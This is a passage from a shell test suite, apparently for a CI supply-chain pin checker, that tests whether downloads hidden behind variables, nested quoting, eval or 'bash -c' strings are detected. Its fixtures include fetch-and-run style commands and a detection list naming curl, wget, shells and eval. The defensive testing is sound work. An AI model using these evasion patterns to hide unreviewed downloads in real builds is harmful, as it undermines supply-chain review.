assert set(inv.inventory(a)) != set(inv.inventory(b))
it = next(iter(inv.inventory(b).values()))
assert "${" in it.path and "printf %s" in it.path, it.path
comp = {".github/actions/x/action.yml": "name: x\nruns:\n  using: composite\n  steps:\n    - shell: bash\n      run: pip install black\n"}
assert set(inv.inventory(comp)) == {"package:pypi/black@(unpinned)#step:c38ddd42b810871e60f5080663fe9d5d899dd5a38d61c1563b41a1b78a56eed5"}
assert all(it.step for it in inv.inventory(wf("x.tgz?download=${A}")).values())   # a quoted string holding a variable is unresolved (whole-file identity): fail-closed, advisor 0442
PY

CASE="release downloads behind variables, round 3 (seat B): reordered assignments, the spacing of a continued value inside the download line itself, and the literals of an expression in a latest/download URL are each part of the identity "
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys, json
s = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(s); s.loader.exec_module(inv)
coll = lambda path, b, a: bool(inv.moved(inv.inventory({path: b}), inv.inventory({path: a})))
dl = "curl https://github.com/o/r/releases/download/v1.2.3/${A}.tgz\n"
for p in ("bin/x.sh", "bin/install-scanner.sh"):
    assert coll(p, "A=x\nA=y\n" + dl + "A=z\n", "A=y\nA=x\n" + dl + "A=z\n"), p
    cont = lambda n: 'curl "https://github.com/o/r/releases/download/v1.2.3/${A:-$(printf "%s" "x\\\n' + " " * n + '.tgz" | tr " " "_")}"\n'
    assert coll(p, cont(2), cont(3)), p
wf = lambda run: "on: push\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - run: " + json.dumps(run) + "\n"
latest = "curl https://github.com/o/r/releases/latest/download/${{ contains('a  b', 'a b') }}.tgz"
assert coll(".github/workflows/ci.yml", wf(latest), wf(latest.replace("'a  b'", "'a b'")))
PY

CASE="release downloads behind variables, round 4 findings: a variable after a quote that closed the URL, a name with a command substitution or backticks or a positional parameter, and assignments in the forms A=x B=old, export A=x B=old and declare -r A= are each part of the identity and refused "
check python3 - "$here/../supply-chain/pin-inventory.py" "$here/../supply-chain/pin-age-check.py" <<'PY'
import importlib.util, sys, json, datetime as dt
def load(n, p):
    s = importlib.util.spec_from_file_location(n, p); m = importlib.util.module_from_spec(s); s.loader.exec_module(m); return m
inv, age = load("inv", sys.argv[1]), load("age", sys.argv[2])
url = "https://github.com/o/r/releases/download/v1.2.3/"
wf = lambda run: {".github/workflows/x.yml": "on: push\nenv:\n  A: old\n  B: new\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - run: " + json.dumps(run) + "\n"}
b1a, b1b = wf('curl "' + url + 'tool-"${A}.tgz'), wf('curl "' + url + 'tool-"${B}.tgz')
assert inv.moved(inv.inventory(b1a), inv.inventory(b1b))
now = dt.datetime(2026, 10, 14, tzinfo=dt.timezone.utc)
for name in ("$(uname -m).tgz", "`uname -m`.tgz", "$1.tgz", "$((1+1)).tgz"):
    it = next(iter(inv.inventory(wf("curl " + url + "tool-" + name)).values()))
    assert it.step, (name, it.key)
dl = "curl " + url + "${B}.tgz\n"
for path in ("bin/x.sh", "bin/install-scanner.sh"):
    for pre in ("A=x B=", "export A=x B=", "declare -r B=", "export UNUSED=fixed B="):
        assert inv.moved(inv.inventory({path: pre + "old\n" + dl}), inv.inventory({path: pre + "new\n" + dl})), (path, pre)
PY

CASE="release downloads behind variables, round 5 findings: a quoted exported assignment (export \"A=\$B\") is part of the identity, and a quote inside an earlier command substitution does not change a concrete asset's key "
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
s = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(s); s.loader.exec_module(inv)
dl = "curl https://github.com/o/r/releases/download/v1.2.3/${A}.tgz\n"
for path in ("bin/x.sh", "bin/install-scanner.sh"):
    for decl in ('export "A=$%s"', "export 'A=$%s'", 'declare -x "A=$%s"', 'readonly "A=$%s"'):
        b = {path: "B=x.tgz\nC=y.tgz\n" + decl % "B" + "\n" + dl}; a = {path: "B=x.tgz\nC=y.tgz\n" + decl % "C" + "\n" + dl}
        assert inv.moved(inv.inventory(b), inv.inventory(a)), (path, decl)
for pre in ("x=$(printf '%s' ok); ", 'x=$(printf "%s" ok); ', "x=$(echo 'a)b'); ", 'x=$(echo "$(printf \'q\')"); ', "x=`echo 'a'`; "):
    items = []
    inv._step({"run": pre + 'curl https://github.com/o/r/releases/download/v1.2.3/x.tgz -o "$OUT"'}, items, {})
    assert {it.key for it in items} == {"tool:o/r/x.tgz@v1.2.3"}, (pre, [it.key for it in items])
PY

CASE="release downloads behind variables, round 6 findings: a variable read only inside \$(( )), a concrete download inside a command substitution, and the caller's env of a local composite call are part of the identity or leave the concrete key alone "
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys, json
s = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(s); s.loader.exec_module(inv)
url = "https://github.com/o/r/releases/download/v1.2.3/"
for path in ("bin/x.sh", "bin/install-scanner.sh"):
    sc = lambda n: {path: "N=" + str(n) + "\ncurl " + url + "tool-$((N)).tgz\n"}
    assert inv.moved(inv.inventory(sc(1)), inv.inventory(sc(2))), path
for run in ('body=$(curl ' + url + 'x.tgz -o "$OUT")', 'a=`curl ' + url + 'x.tgz -o "$OUT"`', 'b="$(curl ' + url + 'x.tgz -o x)"'):
    assert set(inv.inventory({"bin/x.sh": run + "\n"})) == {"tool:o/r/x.tgz@v1.2.3"}, run
action = json.dumps({"name": "x", "runs": {"using": "composite", "steps": [{"shell": "bash", "run": "curl " + url + "${ASSET}.tgz"}]}})
def tree(asset):
    wf = {"on": "push", "jobs": {"j": {"runs-on": "ubuntu-latest", "steps": [{"uses": "./.github/actions/x", "env": {"ASSET": asset}}]}}}
    return {".github/actions/x/action.yml": action, ".github/workflows/x.yml": json.dumps(wf)}
assert inv.moved(inv.inventory(tree("old")), inv.inventory(tree("new")))
PY

CASE="release downloads behind variables, round 7 findings: an array element write and an indirect or indexed expansion are part of the identity, the inherited workflow env and matrix are part of a local action call's identity, a concrete download in double-quoted backticks or in a quoted URL followed by arguments keeps its concrete key "
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys, json
s = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(s); s.loader.exec_module(inv)
url = "https://github.com/o/r/releases/download/v1.2.3/"
for path in ("bin/x.sh", "bin/install-scanner.sh"):
    for pre, ref in (("A[0]=%s", "${A}"), ("ASSETS[0]=%s", "${ASSETS[0]}"), ("ASSETS[1]=%s", "${ASSETS[1]}"), ("SEL=%s", "${!P}")):
        extra = "P=SEL\n" if "!P" in ref else ""
        sc = lambda v: {path: extra + pre % v + "\ncurl " + url + ref + ".tgz -o x\n"}
        assert inv.moved(inv.inventory(sc("old")), inv.inventory(sc("new"))), (path, pre, ref)
    idx = lambda i: {path: "ASSETS[0]=a\nASSETS[1]=b\nIDX=" + str(i) + "\ncurl " + url + "${ASSETS[IDX]}.tgz\n"}
    assert inv.moved(inv.inventory(idx(0)), inv.inventory(idx(1))), path
action = json.dumps({"name": "x", "runs": {"using": "composite", "steps": [{"shell": "bash", "run": "curl " + url + "${ASSET}.tgz -o x"}]}})
def tree(**kw):
    wf = {"on": "push", "jobs": {"j": {"runs-on": "ubuntu-latest", "steps": [{"uses": "./.github/actions/x"}]}}}
    if "wenv" in kw: wf["env"] = {"ASSET": kw["wenv"]}
    if "jenv" in kw: wf["jobs"]["j"]["env"] = {"ASSET": kw["jenv"]}
    if "matrix" in kw: wf["jobs"]["j"]["strategy"] = {"matrix": {"asset": [kw["matrix"]]}}
    return {".github/actions/x/action.yml": action, ".github/workflows/x.yml": json.dumps(wf)}
for k in ("wenv", "jenv", "matrix"):
    assert inv.moved(inv.inventory(tree(**{k: "old"})), inv.inventory(tree(**{k: "new"}))), k
for run in ('body="`curl ' + url + 'x.tgz -o x`"', 'curl "' + url + 'x.tgz" -o "$OUT"', "curl '" + url + "x.tgz' -o \"$OUT\""):
    assert set(inv.inventory({"bin/x.sh": run + "\n"})) == {"tool:o/r/x.tgz@v1.2.3"}, (run, sorted(inv.inventory({"bin/x.sh": run + "\n"})))
PY

CASE="release downloads behind variables, round 7 findings (seat A): a name written by printf -v or read, a name written to GITHUB_ENV by an earlier step, a concrete download inside a quoted program string, and a plain local action call under on: push keeps its key "
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys, json
s = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(s); s.loader.exec_module(inv)
url = "https://github.com/o/r/releases/download/v1.2.3/"
mv = lambda a, b: bool(inv.moved(inv.inventory(a), inv.inventory(b)))
for path in ("bin/x.sh", "bin/install-scanner.sh"):
    sc = lambda v: {path: "B=old C=new\nprintf -v A %s \"$" + v + "\"\ncurl " + url + "${A}.tgz\n"}
    assert mv(sc("B"), sc("C")), ("printf -v", path)
    rd = lambda v: {path: "B=old\nC=new\nread -r A <<< \"$" + v + "\"\ncurl " + url + "${A}.tgz\n"}
    assert mv(rd("B"), rd("C")), ("read", path)
def wf(v):
    steps = [{"run": "echo ASSET=$" + v + " >> \"$GITHUB_ENV\""}, {"run": "curl " + url + "${ASSET}.tgz"}]
    return {".github/workflows/x.yml": json.dumps({"on": "push", "env": {"B": "old", "C": "new"}, "jobs": {"j": {"runs-on": "ubuntu-latest", "steps": steps}}})}
assert mv(wf("B"), wf("C")), "GITHUB_ENV"
for run in ("bash -c 'curl " + url + "x.tgz -o \"$OUT\"'", "sh -c 'wget " + url + "x.tgz -O \"$OUT\"'", 'bash -c "curl ' + url + 'x.tgz -o $OUT"'):
    its = list(inv.inventory({"bin/x.sh": run + "\n"}).values())     # a quoted program string that holds a variable is not parsed: its URL is unresolved (refused), never read as a concrete key
    assert len(its) == 1 and "$" in its[0].path, (run, [i.key for i in its])
plain = {".github/actions/x/action.yml": "name: x\nruns:\n  using: composite\n  steps:\n    - shell: bash\n      run: echo hi\n",
         ".github/workflows/x.yml": "on: push\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: ./.github/actions/x\n"}
assert all(k.endswith("@(local)") for k in inv.inventory(plain) if k.startswith("action:local")), sorted(inv.inventory(plain))
PY

CASE="release downloads behind variables, round 7 findings (seat B): a quoted parenthesis, an indirection through an assignment and a multiline array cannot hide a changed asset because an unresolved asset is identified by its whole file "
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys, json
s = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(s); s.loader.exec_module(inv)
url = "https://github.com/o/r/releases/download/v1.2.3/"
mv = lambda a, b: bool(inv.moved(inv.inventory(a), inv.inventory(b)))
def wf(v):
    return {".github/workflows/x.yml": "on: push\nenv:\n  A: old\n  B: new\njobs:\n  j:\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n          body=$(curl \"" + url + "tool)\"${" + v + "}.tgz)\n"}
assert mv(wf("A"), wf("B")), "quoted parenthesis"
for path in ("bin/x.sh", "bin/install-scanner.sh"):
    ind = lambda v: {path: "SEL=" + v + "\nP=SEL\nA=${!P}\ncurl " + url + "${A}.tgz\n"}
    assert mv(ind("old"), ind("new")), ("indirect", path)
    arr = lambda v: {path: "A=(\n  " + v + "\n)\ncurl " + url + "${A[0]}.tgz\n"}
    assert mv(arr("old"), arr("new")), ("array", path)
    # an edit anywhere in a file that holds an unresolved download is a moved item; a file with only concrete downloads is unchanged by an unrelated edit
    conc = lambda c: {path: "# " + c + "\ncurl " + url + "x.tgz -o x\n"}
    assert not mv(conc("a"), conc("b")), ("concrete", path)
    assert set(inv.inventory(conc("a"))) == {"tool:o/r/x.tgz@v1.2.3"}
PY

CASE="release downloads behind variables, round 8 findings (same class, nested quoting): a release URL inside a quoted program string that holds a variable, a substitution or a command separator is unresolved (whole-file identity, refused by the age judge), a variable after a quoted parenthesis is part of the name, and a plain quoted download keeps its key "
check python3 - "$here/../supply-chain/pin-inventory.py" "$here/../supply-chain/pin-age-check.py" <<'PY'
import importlib.util, sys, json, datetime as dt
def load(n, p):
    s = importlib.util.spec_from_file_location(n, p); m = importlib.util.module_from_spec(s); s.loader.exec_module(m); return m
inv, age = load("inv", sys.argv[1]), load("age", sys.argv[2])
url = "https://github.com/o/r/releases/download/v1.2.3/"
now = dt.datetime(2026, 10, 14, tzinfo=dt.timezone.utc)
def wf(run): return {".github/workflows/p.yml": json.dumps({"on": "push", "jobs": {"j": {"runs-on": "ubuntu-latest", "env": {"A": "old", "B": "new", "OUT": "o"}, "steps": [{"run": run}]}}})}
# nested program strings holding $, a substitution or a separator: unresolved and refused
for run in ("bash -c 'curl \"" + url + "tool;${A}.tgz\"'", "bash -c \"curl " + url + "x.tgz;:>$OUT\"", "bash -c 'curl " + url + "x.tgz -o \"$OUT\"'", "sh -c 'wget " + url + "x.tgz -O \"$OUT\"'", "eval \"curl " + url + "x.tgz $EXTRA\""):
    its = list(inv.inventory(wf(run)).values())
    assert len(its) == 1 and ("$" in its[0].path or "`" in its[0].path), (run, [i.key for i in its])
# a variable after a quoted parenthesis changes the name
a = {"bin/x.sh": "curl '" + url + "tool)'${A}.tgz -o x\n"}; b = {"bin/x.sh": "curl '" + url + "tool)'${B}.tgz -o x\n"}
assert inv.moved(inv.inventory(a), inv.inventory(b))
# a plain quoted URL with an argument after it, and a program string with nothing dynamic, keep their keys
for run in ("curl \"" + url + "x.tgz\" -o \"$OUT\"", "bash -c 'curl " + url + "x.tgz -o x'"):
    assert set(inv.inventory({"bin/x.sh": run + "\n"})) == {"tool:o/r/x.tgz@v1.2.3"}, run
PY

CASE="release downloads behind variables, round 9 finding (both seats, same class): a quote segment that merely BEGINS with the release URL inside a quoted program string (eval 'curl \"''https://.../tool;\${A}.tgz''\"') is not an ordinary URL operand: the name is unresolved (whole-file identity, refused by the age judge) and a variable edit is a moved item; a word that is the URL itself keeps its concrete key "
check python3 - "$here/../supply-chain/pin-inventory.py" "$here/../supply-chain/pin-age-check.py" <<'PY'
import importlib.util, sys, json, datetime as dt
def load(n, p):
    s = importlib.util.spec_from_file_location(n, p); m = importlib.util.module_from_spec(s); s.loader.exec_module(m); return m
inv, age = load("inv", sys.argv[1]), load("age", sys.argv[2])
url = "https://github.com/o/r/releases/download/v1.2.3/"
def tree(var, run):
    w = {"on": "push", "jobs": {"j": {"runs-on": "ubuntu-latest", "env": {"A": "old", "B": "new"}, "steps": [{"run": run.replace("VAR", var)}]}}}
    return {".github/workflows/p.yml": json.dumps(w)}
for run in ("eval 'curl \"''" + url + "tool;${VAR}.tgz''\"'",
            "sh -c 'curl \"'\"'" + url + "tool-${VAR}.tgz'\"'\"'",
            "bash -c \"curl '\"'\"'" + url + "tool;${VAR}.tgz'\"'\"'\""):
    a, b = inv.inventory(tree("A", run)), inv.inventory(tree("B", run))
    assert inv.moved(a, b), run
    it = next(iter(b.values()))
ok = tree("A", 'curl "' + url + 'x.tgz?download=${A}"')
assert all(it.step for it in inv.inventory(ok).values()), sorted(inv.inventory(ok))   # fail-closed: no refinement for a quoted word that is the URL (advisor 0442)
PY

# --- advisor ruling Oct 16 (cache#347): a listed path ABSENT from the tree is accepted (the reviewed list pre-authorizes only that one exact path); a listed file that
#     EXISTS and does not name the folder is still refused.
python3 - "$work" <<'PY'
import importlib.util, os, sys, tempfile
sys.path.insert(0, ".")
spec = importlib.util.spec_from_file_location("pi", ".github/agent/supply-chain/pin-inventory.py"); m = importlib.util.module_from_spec(spec); sys.modules["pi"] = m; spec.loader.exec_module(m)
with tempfile.TemporaryDirectory(dir=sys.argv[1]) as td:
    os.makedirs(td + "/bin")
    open(td + "/bin/names.sh", "w").write("ls vendor/x\n")
    open(td + "/bin/quiet.sh", "w").write("echo hello\n")
    files = {"bin/names.sh": "ls vendor/x\n", "bin/quiet.sh": "echo hello\n"}
    m._VENDOR_NAMING_FILES = frozenset({"bin/names.sh", "bin/absent.sh"})
    assert m.vendor_list_extras(td, files) == [], "a listed file that names the folder, and a listed path that is absent, are both accepted"
    m._VENDOR_NAMING_FILES = frozenset({"bin/names.sh", "bin/quiet.sh", "bin/absent.sh"})
    assert m.vendor_list_extras(td, files) == ["bin/quiet.sh"], "a listed file that exists and does not name the folder is refused; the absent one is not"
PY
CASE="the exact list: an absent listed path is accepted and a present listed file that names nothing is refused"
check test $? -eq 0
# --- REQ-SUP-001-the one curl line of bin/refresh-inputs.sh that fetches the Alpine linux-virt package has no ruling of its own ---
# A download row rules a line only under the text, live-fetch, Go-toolchain or pinned-fetch ruling; any other ruling text rules nothing.
AL='/usr/bin/curl -q -fsSL -g --max-filesize 268435456 --max-time 900 --proto =https --tlsv1.2 -o "$tmp/dl/x86_64/$f" "https://dl-cdn.alpinelinux.org/alpine/v3.24/main/x86_64/$f" || die "could not download the kernel package from the Alpine mirror" 1'
HLP='hash-locked fetch, orchestrator ruling Nov 5 (audits/reviews/cache-840-kernel-fetch.md): '
twoc al-none bin/refresh-inputs.sh $'#!/bin/sh\n' "#!/bin/sh"$'\n'"        $AL"$'\n'

# --- D3: a `uses: ./<path>` line (a local action, a local reusable workflow) is a file of the same commit, not a pin ---
cat >"$work/d3-callee.yml" <<EOT
on: workflow_call
jobs:
  k:
    runs-on: ubuntu-latest
    steps:
      - run: echo callee
EOT

# --- the base of a change is the PARENT commit of the head: an item the head commit itself adds is a change, the same item already in the parent is not ---
NEWP=$(printf 'd%.0s' $(seq 40))
newcase parent "$(sub .github/workflows/ci.yml "actions/checkout@$SHA1 # v4.1.0" "actions/checkout@$NEWP # v4.2.0")"
git -C "$work/parent" commit -q --allow-empty -m "second head"
runck parent
newcase parent1 "$(sub .github/workflows/ci.yml "actions/checkout@$SHA1 # v4.1.0" "actions/checkout@$NEWP # v4.2.0")"
runck parent1

runck goage

CASE="owner rule 1: a changed trigger MOVES a variable placeholder; a changed paths filter does not"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY2'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1])
inv = importlib.util.module_from_spec(spec)
spec.loader.exec_module(inv)
def wf(on, run='docker run --rm "$IMAGE" true', env="alpine:3.20", jobenv="", top=""):
    steps = "    steps:\n      - env:\n          IMAGE: " + env + "\n        run: " + run + "\n"
    return {".github/workflows/a.yml": top + "on:\n" + on + "jobs:\n  j:\n" + jobenv + steps}
base = "  push:\n    branches: [main]\n  pull_request:\n"
def moved(a, b):
    """the placeholder (variable image) itself is among the items the head adds"""
    return [i.key for i in inv.moved(inv.inventory(a), inv.inventory(b)) if "(variable)" in i.key]
def moves(label, a, b): assert moved(a, b), label + ": must move the placeholder"
def still(label, a, b): assert not moved(a, b), label + ": must move nothing"
# a changed paths filter chooses whether a run happens, never what it fetches
still("paths filter added", wf(base), wf(base.replace("pull_request:\n", "pull_request:\n    paths: [bin/**]\n")))
still("paths-ignore changed", wf(base + "    paths-ignore: [a]\n"), wf(base + "    paths-ignore: [b]\n"))
# every other trigger change moves it
moves("merge_group added", wf(base), wf(base + "  merge_group:\n"))
moves("branch filter", wf(base), wf("  push:\n    branches: [main, dev]\n  pull_request:\n"))
moves("types filter", wf(base), wf(base.replace("pull_request:\n", "pull_request:\n    types: [opened]\n")))
moves("event removed", wf(base), wf("  push:\n    branches: [main]\n"))
moves("cron-only change", wf("  schedule:\n    - cron: '0 1 * * *'\n"), wf("  schedule:\n    - cron: '*/5 * * * *'\n"))
ref_run = 'docker run --rm "${{ github.ref_name }}" true'
moves("tags filter read via ref_name",
      wf("  push:\n    tags: ['v1.*']\n", run=ref_run), wf("  push:\n    tags: ['*']\n", run=ref_run))
moves("repository_dispatch added", wf(base), wf(base + "  repository_dispatch:\n    types: [scan]\n"))
call = lambda v, out="a": ("  workflow_call:\n    inputs:\n      image-ref:\n        default: " + v
                           + "\n    outputs:\n      image:\n        value: ${{ jobs.j.outputs." + out + " }}\n")
disp = lambda v: "  workflow_dispatch:\n    inputs:\n      image-ref:\n        default: " + v + "\n"
moves("workflow_call input default", wf(call("a")), wf(call("b")))
moves("workflow_dispatch input default", wf(disp("a")), wf(disp("b")))
moves("workflow_call output mapping", wf(call("a", "a")), wf(call("a", "b")))
# the step's own text, its env value (two tag-only values: the placeholder itself moves), the job env and the
# workflow env still move it
moves("env value", wf(base, env="alpine:3.20"), wf(base, env="alpine:3.21"))
moves("step text", wf(base), wf(base, run='docker run --rm "$IMAGE" false'))
moves("job env", wf(base), wf(base, jobenv="    env:\n      X: y\n"))
moves("workflow env", wf(base, top="env:\n  X: y\n"), wf(base, top="env:\n  X: z\n"))
# a scalar or list `on` is unchanged, and nothing changed moves nothing
still("nothing changed", wf(base), wf(base))
PY2

# --- REQ-SUP-001-a checksum file for an upstream artifact is an item named by its content, an exact version the scan reads as a pin; no row dates it and no time is read ---
FPFILE=.github/policy/gradle-wrapper-jar-sha256.txt
FPTEXT="7a9ce74cff467ca1bf60a4fcd9f05185acceda4d0f382434d393e17864262c5d  bench/gradle-sample/gradle/wrapper/gradle-wrapper.jar"
newcase fp "
import pathlib
p = pathlib.Path('.github/policy'); p.mkdir(parents=True, exist_ok=True)
(p / 'gradle-wrapper-jar-sha256.txt').write_text('$FPTEXT\\n')"
runck fp
printf '{"base_inputs": ["%s"]}' "$FPFILE" >"$work/fp-bi.json"
runck fp --base-inputs "$work/fp-bi.json"

# --- rc-5b item 6 (A4, R7, R8, R12): the checksum is part of an item's identity; a server proof beats the PR clock for tools and packages; a label that does not resolve is "age not provable"; the Go proxy's case escaping ---
A64=$(printf 'a%.0s' $(seq 64)); B64=$(printf 'b%.0s' $(seq 64))
newcase sum-scanner "$(sub bin/install-scanner.sh "SUM=$A64" "SUM=$B64")"
runck sum-scanner
newcase sum-req "$(sub .github/pins/adjudicator-requirements.txt '--hash=sha256:aaaa' '--hash=sha256:cccc')"
runck sum-req
newcase sum-comment "pathlib=__import__('pathlib'); p=pathlib.Path('bin/install-scanner.sh'); p.write_text(p.read_text()+'# a note\n')"
runck sum-comment
# --- rc-5b item 6, round 1 rulings on #639 (ancestry, unusable server proof, no cap, literal-download sums, sums across files) -----------------------------------------------------------------
CASE="sum: a literal release download inside an installer arm (crane) carries its arm's sums; changing only that sum is a moved item"
check python3 - "$chk" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
inv = ac.inv
def files(sm):
    return {"bin/install-scanner.sh": '#!/usr/bin/env bash\ncase "${TOOL}:${arch}" in\n  crane:x86_64|crane:amd64) SUM=' + sm + ' ;;\nesac\ncase "$TOOL" in\n  crane)\n    curl -fsSL -o "$tmp/c.tgz" "https://github.com/google/go-containerregistry/releases/download/v0.22.1/go-containerregistry_Linux_x86_64.tar.gz" || pipeline_fail "download failed"\n    ;;\nesac\n'}
a, b = inv.inventory(files("a" * 64)), inv.inventory(files("b" * 64))
assert any("go-containerregistry" in k for k in a), list(a)
assert inv.moved(a, b) and not inv.moved(a, inv.inventory(files("a" * 64)))
PY
CASE="sum: the same package pinned in two requirements files: a hash change in the SECOND file is a moved item"
check python3 - "$chk" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
inv = ac.inv
r = lambda h: "demo==1.2.3 \\\n    --hash=sha256:" + h + "\n"
a = inv.inventory({"a/requirements.txt": r("aa"), "b/requirements.txt": r("bb")})
b = inv.inventory({"a/requirements.txt": r("aa"), "b/requirements.txt": r("cc")})
assert inv.moved(a, b), "a hash change in the second file was hidden by the first"
assert not inv.moved(a, inv.inventory({"a/requirements.txt": r("aa"), "b/requirements.txt": r("bb")}))
PY
CASE="sum: a decoy arm label inside a heredoc (xq) cannot hide the crane arm's sums: with no sums found for a literal download the identity is the whole script, so a sum-only edit is a moved item"
check python3 - "$chk" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
inv = ac.inv
def files(sm, decoy=True):
    d = "    : <<'EOF'\n  xq)\nEOF\n" if decoy else ""
    return {"bin/install-scanner.sh": '#!/usr/bin/env bash\ncase "${TOOL}:${arch}" in\n  crane:x86_64|crane:amd64) SUM=' + sm + ' ;;\nesac\ncase "$TOOL" in\n  crane)\n' + d + '    curl -fsSL -o "$tmp/c.tgz" "https://github.com/google/go-containerregistry/releases/download/v0.22.1/go-containerregistry_Linux_x86_64.tar.gz" || pipeline_fail "download failed"\n    ;;\nesac\n'}
assert inv.moved(inv.inventory(files("a" * 64)), inv.inventory(files("b" * 64))), "a sum-only edit behind a decoy arm label was not seen"
assert not inv.moved(inv.inventory(files("a" * 64)), inv.inventory(files("a" * 64)))
PY
CASE="sum: a download in a multi-label arm (a|b)) or after esac is in no single tool's arm: no foreign sums attach and a sum-only edit of its own row is a moved item (Fable ruling on #639)"
check python3 - "$chk" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("ac", sys.argv[1]); ac = importlib.util.module_from_spec(spec); spec.loader.exec_module(ac)
inv = ac.inv
DL = '    curl -fsSL -o "$tmp/c.tgz" "https://github.com/google/go-containerregistry/releases/download/v0.22.1/go-containerregistry_Linux_x86_64.tar.gz" || pipeline_fail "download failed"\n'
HEAD = '#!/usr/bin/env bash\ncase "${TOOL}:${arch}" in\n  foo:amd64) SUM=' + "f" * 64 + ' ;;\n  crane:amd64) SUM=%s ;;\nesac\ncase "$TOOL" in\n  foo)\n    echo foo\n    ;;\n'
def multi(sm):
    return {"bin/install-scanner.sh": HEAD % sm + "  crane|other)\n" + DL + "    ;;\nesac\n"}
def after(sm):
    return {"bin/install-scanner.sh": HEAD % sm + "esac\n" + DL}
for name, mk in (("a|b) arm", multi), ("after esac", after)):
    a, b = inv.inventory(mk("a" * 64)), inv.inventory(mk("b" * 64))
    dl = [it for it in a.values() if "go-containerregistry" in it.name]
    assert dl, (name, list(a))
    assert not any("f" * 64 in it.sums for it in dl), (name, "foreign sums attached", [it.sums for it in dl])
    assert inv.moved(a, b), (name, "a sum-only edit was not a moved item")
    assert not inv.moved(a, inv.inventory(mk("a" * 64))), name
PY
# --- mutants: one exact edit each, in a temp copy of the scripts; every mutant must make at least one case above fail --------------------------------
# The edits anchor on these exact strings (the first is the line the code change must add to pin-inventory.py; the others are existing code):
#   KERNEL_LOCK = "build/locks/vm-kernel.lock"                                  (pin-inventory.py: the one constant _wanted and the row reader both use)
#   return _sumid(self.sums)                                                    (pin-inventory.py, Item.sum)
#           if not is_pin(m.group(2)):                                   (pin-inventory.py, _kernel_lock_items: the version of a row must be a pin)
#           if not m:                                                    (pin-inventory.py, _kernel_lock_items: a row
#           that does not parse is an error)
#   return [head_items[k] for k in sorted(head_items) if k not in base_items or base_items[k].sum != head_items[k].sum]    (pin-inventory.py, moved)
mutate() {   # NAME FILE OLD NEW -> $work/mut/NAME/.github/agent/supply-chain, rc 3 when OLD is not found exactly once
  local m="$work/mut/$1"; rm -rf "${m:?}"; mkdir -p "$m/.github/agent" "$m/.github/policy"
  cp -R "$here/../supply-chain" "$m/.github/agent/supply-chain"
  cp "$root/.github/supply-chain-exceptions.json" "$m/.github/" 2>/dev/null || true; cp "$root/.github/policy/base-inputs.json" "$m/.github/policy/" 2>/dev/null || true
  python3 - "$m/.github/agent/supply-chain/$2" "$3" "$4" <<'PY'
import sys
p, old, new = sys.argv[1:4]
s = open(p).read()
sys.exit(3) if s.count(old) != 1 else open(p, "w").write(s.replace(old, new))
PY
}
mutant() {   # NAME FILE OLD NEW [CASES]: the cases that must see it (default: the first ten)
  local rcm=0 sel=${5:-$LCOLD}; mutate "$1" "$2" "$3" "$4" || rcm=$?
  CASE="kernel row mutant $1: the edit applies to the code"
  if [ "$rcm" -ne 0 ]; then echo "PENDING-CODE: mutant $1 cannot apply (its anchor in $2 is missing or not unique): $3"; bad "$CASE"; return; fi
  LCHK="$work/mut/$1/.github/agent/supply-chain/pin-age-check.py"; LINV="$work/mut/$1/.github/agent/supply-chain/pin-inventory.py"
  LCSEL="$sel"; lc_all; LCSEL=""
  CASE="kernel row mutant $1 is killed (a case above fails)"
  if [ -n "$LCFAIL" ]; then ok "$CASE"; echo "mutant killed: $1 (failing cases:$LCFAIL)"; else bad "$CASE"; echo "mutant SURVIVED: $1"; fi
  LCHK=$chk; LINV=$here/../supply-chain/pin-inventory.py
}

CASE="D1: a variable that holds curl, wget, a shell or source/./eval/builtin is that word as a command word, quoted or not: the line that uses it is its own finding"
check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
import importlib.util, sys
spec = importlib.util.spec_from_file_location("inv", sys.argv[1]); inv = importlib.util.module_from_spec(spec); spec.loader.exec_module(inv)
def found(use, holder):
    text = "#!/bin/sh\nX=" + holder + "\n" + use + "\n"
    return any(flat == use for _key, flat, _bashlike in inv.unmeasured_occurrences({"bin/x.sh": text}))
misses = []
for holder, use in (("curl", '$X -fsSL https://example.org/t.sh -o t'), ("curl", '"$X" -fsSL https://example.org/t.sh -o t'),
                    ("wget", '$X https://example.org/t.sh'), ("wget", '"$X" https://example.org/t.sh'),
                    ("bash", '$X "$SCRIPT"'), ("bash", '"$X" "$SCRIPT"'), ("sh", '$X "$SCRIPT"'), ("sh", '"$X" "$SCRIPT"'),
                    ("source", '$X "$LIB"'), ("source", '"$X" "$LIB"'), (".", '$X "$LIB"'), (".", '"$X" "$LIB"'),
                    ("eval", '$X "$CMD"'), ("eval", '"$X" "$CMD"'), ("builtin", '$X source "$LIB"'), ("builtin", '"$X" source "$LIB"')):
    if not found(use, holder):
        misses.append((holder, use))
assert not misses, misses
